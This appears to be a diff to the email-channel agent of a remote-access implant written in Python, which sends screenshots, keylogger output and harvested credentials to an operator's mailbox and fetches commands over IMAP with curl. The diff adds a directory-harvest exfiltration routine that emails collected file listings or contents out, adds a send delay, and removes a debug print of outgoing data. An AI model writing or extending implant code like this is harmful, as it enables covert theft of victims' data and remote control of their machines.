@@ -33,12 +33,14 @@ class EMailAgent(LocalAgent):
 	EMAIL_OUTGOING_USERNAME = "FILL";
 	EMAIL_OUTGOING_PASSWORD = "FILL";
 	EMAIL_CMD_ADDR = "FILL";
+	EMAIL_DIR_HARVEST_COOLDOWN_INTERVAL = 1
 
 	EMAIL_PROTOCOL_TAG = "SMTP";
 
 	SCREENSHOT_EMAIL_TAG = "Screenshot: ";
 	KEYLOGGER_EMAIL_TAG = "Keylogger: ";
 	PORTFORWARD_EMAIL_TAG = "PortForward: "
+	DIR_HARVEST_EMAIL_TAG = "DirectoryHarvest: "
 	HARVEST_EMAIL_TAG = "HARVEST";
 	PROTOCOL_TAG = "PROTOCOL";
 	USERNAME_TAG = "USERNAME";
@@ -119,24 +121,29 @@ class EMailAgent(LocalAgent):
 		if "curl: (" in sendEmailResponseErr:
 			print("Cannot transmit email: " + sendEmailResponseErr)
 		os.remove(self.OUTGOING_EMAIL_TMP_FILENAME)
+		time.sleep(self.EMAIL_DIR_HARVEST_COOLDOWN_INTERVAL)
 		self.curlLock.release()
 	
 	def getScriptName(self):
 		return os.path.realpath(__file__) 
         
 	def postResponse(self, cmd_output):
-		print("Sending: " + cmd_output)
 		self.sendEmail(self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG), cmd_output);
         
 	def postScreenshot(self, cmd_output):
 		subject = self.SCREENSHOT_EMAIL_TAG + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
 		self.sendEmail(subject, cmd_output);
+
+	def postDirHarvest(self, content, session_id):
+		subject = self.DIR_HARVEST_EMAIL_TAG + str(session_id) + " " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
+		self.sendEmail(subject, content);
 			
 	def postHarvest(self, cmd_output, harvestType):
 		subject = self.HARVEST_EMAIL_TAG + ":" + harvestType + " " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
 		self.sendEmail(subject, cmd_output);
 	
 	def getNextEmail(self):
+		self.curlLock.acquire()
 		grabUIDInference = "curl " + self.IMAP_EMAIL_URL + "/inbox -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " --request \"EXAMINE INBOX\""
 		cmd_output = subprocess.Popen(grabUIDInference, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode("utf-8")
 		if not cmd_output:
@@ -187,7 +194,7 @@ class EMailAgent(LocalAgent):
 	
 		delCmdTwo = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=" + str(tUID) + " -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " -X \"EXPUNGE\""
 		delCmdTwoResponse = subprocess.Popen(delCmdTwo, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode("utf-8")
-	
+		self.curlLock.release()
 		return SimpleEmail(sender, subject, body);    
     
 	def pollServer(self):
